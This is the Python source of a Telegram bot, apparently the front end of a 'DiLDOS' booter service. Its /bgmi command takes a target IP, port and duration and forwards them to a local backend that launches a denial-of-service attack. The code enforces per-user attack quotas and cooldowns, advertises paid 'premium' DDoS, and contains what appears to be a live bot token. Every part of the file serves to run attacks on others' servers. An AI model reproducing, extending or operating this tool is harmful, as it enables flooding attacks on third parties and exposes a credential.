import telebot
import requests
import logging
from datetime import datetime, timedelta, timezone


# Telegram bot token and channel ID
TOKEN = "8063022518:AAHU8hhMeF0CjwLu1qM8igyegcHUUpY0MKA"  # Replace with your bot's API token
CHANNEL_ID = "-1002476942397"  # Replace with your authorized channel ID
BACKEND_URL = "http://127.0.0.1:8001/process_command"  # Backend endpoint
EXEMPTED_USERS = [6768273586, 1431950109, 6111808288, 1340584902, 5317827318, 2007860433, 1056173503, 7082215587]


# Initialize the bot
bot = telebot.TeleBot(TOKEN)

# Logging configuration
logging.basicConfig(level=logging.INFO)

# Constants
COOLDOWN_DURATION = 300  # 5 minutes cooldown in seconds
BAN_DURATION = timedelta(minutes=30)  # Ban duration for missing feedback
DAILY_ATTACK_LIMIT = 10  # Daily attack limit per user
MAX_ATTACK_DURATION = 150  # Maximum attack duration in seconds

# User tracking dictionaries
user_cooldowns = {}  # Tracks user cooldowns
user_attacks = {}    # Tracks daily attack counts per user
user_bans = {}       # Tracks banned users and their ban expiry times
user_photos = {}     # Tracks whether a user has sent photo feedback


# Track midnight reset time (example: UTC+5:30, adapt as needed)
reset_time = datetime.now(timezone(timedelta(hours=5, minutes=30))).replace(
    hour=0, minute=0, second=0, microsecond=0
)

def reset_daily_counts():
    """Resets daily limits, cooldowns, and feedback data once per day."""
    global reset_time
    now_ist = datetime.now(timezone(timedelta(hours=5, minutes=30)))
    if now_ist >= reset_time:
        user_attacks.clear()
        user_cooldowns.clear()
        user_photos.clear()
        user_bans.clear()
        reset_time = reset_time + timedelta(days=1)

# Validation functions
def is_valid_ip(ip):
    parts = ip.split('.')
    return len(parts) == 4 and all(part.isdigit() and 0 <= int(part) <= 255 for part in parts)

def is_valid_port(port):
    return port.isdigit() and 0 <= int(port) <= 65535

def is_valid_duration(duration):
    return duration.isdigit() and int(duration) > 0

# Handler for photos sent by users (feedback)
@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name or "User"
    user_photos[user_id] = True
    bot.send_message(message.chat.id, f"*📸 𝙁𝙀𝙀𝘿𝘽𝙖𝘾𝙆 𝙍𝙚𝘾𝙀𝙄𝙑𝙚𝘿 𝙁𝙍𝙤𝙈 𝙐𝙎𝙚𝙍 {message.from_user.first_name}!*")

# Handler for the /start command
@bot.message_handler(commands=["start"])
def start_command(message):
    if str(message.chat.id) != CHANNEL_ID:
        bot.send_message(
            message.chat.id,
            "*⚠️⚠️ 𝗧𝗵𝗶𝘀 𝗯𝗼𝘁 𝗶𝘀 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘁𝗼 𝗯𝗲 𝘂𝘀𝗲𝗱 𝗵𝗲𝗿𝗲 ⚠️⚠️*\n\n"
            "*[ 𝗕𝗢𝗧 𝗠𝗔𝗗𝗘 𝗕𝗬 : @MrinMoYxCB ( TUMHARE_PAPA ) | 𝗗𝗠 𝗙𝗢𝗥 𝗥𝗘𝗕𝗥𝗔𝗡𝗗𝗜𝗡𝗚 ]*\n\n"
            "*🎉 Join @MRiNxDiLDOSCHAT to use and for all updates! 🎉*"
        )
        return
    bot.send_message(
        message.chat.id,
        "*𝗠𝗥𝗶𝗡 𝘅 𝗗𝗶𝗟𝗗𝗢𝗦™ 𝗣𝗨𝗕𝗟𝗶𝗖 𝗕𝗢𝗧 𝗔𝗖𝗧𝗶𝗩𝗘 ✅*"
    )

# Handler for the /bgmi command
@bot.message_handler(commands=["bgmi"])
def bgmi_command(message):
    global user_cooldowns, user_attacks, user_bans, user_photos

    user_id = message.from_user.id
    user_name = message.from_user.first_name or "Unknown"
    now = datetime.now()

    # Reset daily data if it's a new day
    reset_daily_counts()

    # Ensure the bot is used only in the authorized channel
    if str(message.chat.id) != CHANNEL_ID:
        bot.send_message(
            message.chat.id,
            "*🤡 𝗧𝗵𝗶𝘀 𝗯𝗼𝘁 𝗶𝘀 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘁𝗼 𝗯𝗲 𝘂𝘀𝗲𝗱 𝗵𝗲𝗿𝗲 🤡\n\n 𝘾𝙤𝙈𝙀 𝙃𝙚𝙍𝙀 --> @MRiNxDiLDOSCHaT*"
        )
        return

    # Check if the user is currently banned
    if user_id in user_bans:
        ban_expiry = user_bans[user_id]
        if now < ban_expiry:
            remaining_time = ban_expiry - now
            minutes, seconds = divmod(remaining_time.seconds, 60)
            user_name = message.from_user.first_name or "User"
            bot.send_message(
                message.chat.id,
                f"*⚠️⚠️𝙃𝙞 {message.from_user.first_name} , 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙗𝙖𝙣𝙣𝙚𝙙 𝙛𝙤𝙧 𝙣𝙤𝙩 𝙥𝙧𝙤𝙫𝙞𝙙𝙞𝙣𝙜 𝙛𝙚𝙚𝙙𝙗𝙖𝙘𝙠. 𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 {int(minutes)} 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 𝙖𝙣𝙙 {int(seconds)} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙗𝙚𝙛𝙤𝙧𝙚 𝙩𝙧𝙮𝙞𝙣𝙜 𝙖𝙜𝙖𝙞𝙣 !  ⚠️⚠️*"
            )
            return
        else:
            del user_bans[user_id]  # Remove ban after expiry time passes

    # Get current time consistently
    now = datetime.now()  # or datetime.now(timezone.utc), etc.

    # Check if user is exempted from cooldowns, limits, and feedback requirements
    if user_id not in EXEMPTED_USERS:
        # Check if user is in cooldown
        if user_id in user_cooldowns:
            cooldown_time = user_cooldowns[user_id]
            if datetime.now() < cooldown_time:
                remaining_time = (cooldown_time - datetime.now()).seconds
                bot.send_message(
                    message.chat.id,
                f"*⏳⏳ 𝙃𝙞 {message.from_user.first_name} , 𝙮𝙤𝙪 𝙖𝙧𝙚 𝙘𝙪𝙧𝙧𝙚𝙣𝙩𝙡𝙮 𝙤𝙣 𝙘𝙤𝙤𝙡𝙙𝙤𝙬𝙣. 𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 {remaining_time // 60} 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 𝙖𝙣𝙙 {remaining_time % 60} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙗𝙚𝙛𝙤𝙧𝙚 𝙩𝙧𝙮𝙞𝙣𝙜 𝙖𝙜𝙖𝙞𝙣 ⏳⏳*"
            )
            return

        # If they're allowed to attack now, we'll set the new cooldown end time below

        # Check if they've attacked before but never provided feedback
        if user_attacks.get(user_id, 0) > 0 and not user_photos.get(user_id, False):
            user_bans[user_id] = now + BAN_DURATION
            user_name = message.from_user.first_name or "User"
            bot.send_message(
                message.chat.id,
                "*⚠️⚠️𝙃𝙞 {message.from_user.first_name} , 𝙔𝙤𝙪 𝙝𝙖𝙫𝙚𝙣'𝙩 𝙥𝙧𝙤𝙫𝙞𝙙𝙚𝙙 𝙛𝙚𝙚𝙙𝙗𝙖𝙘𝙠 𝙖𝙛𝙩𝙚𝙧 𝙮𝙤𝙪𝙧 𝙡𝙖𝙨𝙩 𝙖𝙩𝙩𝙖𝙘𝙠. 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙗𝙖𝙣𝙣𝙚𝙙 𝙛𝙧𝙤𝙢 𝙪𝙨𝙞𝙣𝙜 𝙩𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙛𝙤𝙧 30 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 ⚠️*"
            )
            return

    # Parse command arguments
    args = message.text.split()
    if len(args) < 4:
        bot.send_message(
            message.chat.id,
            "*𝗠𝗥𝗶𝗡 𝘅 𝗗𝗶𝗟𝗗𝗢𝗦™ 𝗣𝗨𝗕𝗟𝗶𝗖 𝗕𝗢𝗧 𝗔𝗖𝗧𝗶𝗩𝗘 ✅ \n\n ⚙ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙪𝙨𝙚 𝙩𝙝𝙚 𝙛𝙤𝙧𝙢𝙖𝙩\n /𝗯𝗴𝗺𝗶 <IP> <PORT> <DURATION>*"
        )
        return

    target_ip, target_port, duration_str = args[1:4]
    if not (is_valid_ip(target_ip) and is_valid_port(target_port) and is_valid_duration(duration_str)):
        bot.send_message(message.chat.id, "❌ Invalid format for IP, port, or duration.")
        return

    duration = int(duration_str)
    if duration > MAX_ATTACK_DURATION:
        bot.send_message(message.chat.id, f"*⛔ 𝙈𝙖𝙓𝙞𝙈𝙐𝙈 𝘼𝙏𝙏𝙖𝘾𝙆 𝘿𝙪𝙍𝘼𝙏𝙞𝙊𝙉 𝙞𝙎 𝟭𝟱𝟬 𝙎𝙚𝘾𝙊𝙉𝘿𝙎*")
        return

    # For non-exempted users, enforce daily attack limit
    if user_id not in EXEMPTED_USERS:
        current_attacks = user_attacks.get(user_id, 0)
        if current_attacks >= DAILY_ATTACK_LIMIT:
            user_name = message.from_user.first_name or "User"
            bot.send_message(
                message.chat.id,
                "*𝙃𝙞 {message.from_user.first_name} , 𝙮𝙤𝙪 𝙝𝙖𝙫𝙚 𝙧𝙚𝙖𝙘𝙝𝙚𝙙 𝙩𝙝𝙚 𝙢𝙖𝙭𝙞𝙢𝙪𝙢 𝙣𝙪𝙢𝙗𝙚𝙧 𝙤𝙛 𝙖𝙩𝙩𝙖𝙘𝙠-𝙡𝙞𝙢𝙞𝙩 𝙛𝙤𝙧 𝙩𝙤𝙙𝙖𝙮, 𝘾𝙤𝙢𝙚𝘽𝙖𝙘𝙠 𝙏𝙤𝙢𝙤𝙧𝙧𝙤𝙬 ✌️*"
            )
            return
        user_attacks[user_id] = current_attacks + 1
        user_photos[user_id] = False  # Reset feedback status for next time

    remaining_attacks = (
        DAILY_ATTACK_LIMIT - user_attacks.get(user_id, 0)
        if user_id not in EXEMPTED_USERS
        else DAILY_ATTACK_LIMIT
    )

    # Notify the user about the attack
    user_name = message.from_user.first_name or "User"
    bot.send_message(
        message.chat.id,
        f"*𝙃𝙞 {message.from_user.first_name} , 🚀 𝘼𝙩𝙩𝙖𝙘𝙠 𝙨𝙩𝙖𝙧𝙩𝙚𝙙 𝙤𝙣 {target_ip}:{target_port} 𝙛𝙤𝙧 {duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨.*\n\n"
        f"*𝙍𝙀𝙈𝘼𝙄𝙉𝙄𝙉𝙂 𝘼𝙏𝙏𝘼𝘾𝙆𝙎 𝙁𝙊𝙍 𝙏𝙊𝘿𝘼𝙔 : {remaining_attacks} \n\n ❗️❗️ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙎𝙚𝙣𝙙 𝙁𝙚𝙚𝙙𝙗𝙖𝙘𝙠 ❗️❗️*"
    )

    # Attempt to send the request to your backend
    try:
        response = requests.post(
            BACKEND_URL,
            json={"ip": target_ip, "port": target_port, "duration": duration},
            timeout=1
        )
        response.raise_for_status()
        result = response.json()
        bot.send_message(message.chat.id, result.get("message", "✅ Attack initiated successfully!"))
    except requests.exceptions.RequestException as e:
        bot.send_message(message.chat.id, f"*𝙏𝙃𝙞𝙎 𝘽𝙤𝙩 𝙎𝙐𝙋𝙋𝙤𝙍𝙏𝙎 𝙈𝙤𝙍𝙀 𝙏𝙃𝙖𝙉 𝟮 𝘼𝙏𝙏𝙖𝘾𝙆𝙎..\n\n𝘽𝙐𝙔 𝙋𝙍𝙚𝙈𝙞𝙐𝙈 𝘿𝙞𝙇𝘿𝙊𝙎 𝙁𝙍𝙤𝙈 -> 𝙈𝙧𝙞𝙣𝙈𝙤𝙔 ᶻ 𝗓 𐰁 .ᐟ 𝟮.𝟬  | 𝙈𝙧𝙞𝙣𝙈𝙤𝙔 ᶻ 𝗓 𐰁 .ᐟ *")
        return

    # Set the cooldown for non-exempted users right after a successful attack initiation
    if user_id not in EXEMPTED_USERS:
        user_cooldowns[user_id] = now + timedelta(seconds=COOLDOWN_DURATION)

# Start the bot polling loop
if __name__ == "__main__":
    logging.info("Starting bot...")
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        logging.error(f"An error occurred: {e}")
